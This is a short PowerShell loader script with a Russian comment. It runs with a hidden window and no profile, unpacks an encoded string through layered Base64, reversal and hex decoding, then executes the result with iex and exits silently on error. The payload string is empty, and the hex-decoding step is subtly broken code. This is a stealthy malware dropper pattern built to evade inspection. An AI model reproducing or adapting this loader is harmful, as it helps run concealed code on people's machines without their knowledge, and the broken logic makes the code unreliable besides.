powershell -w hidden -nop -c "
    $enc=''
    try{
        # Reverse decoding steps
        $step1=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($enc))
        $step2=$step1[-1..-$step1.Length] -join ''
        $step3=[System.Text.Encoding]::ASCII.GetString([byte[]]::new($step2.Length/2))
        for($i=0;$i -lt $step2.Length;$i+=2){$step3[$i/2]=[convert]::ToByte($step2.Substring($i,2),16)}
        $decoded=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($step3))
        iex $decoded
    }catch{
        # В случае ошибки - просто выходим, ничего не ломая
        return
    }
    "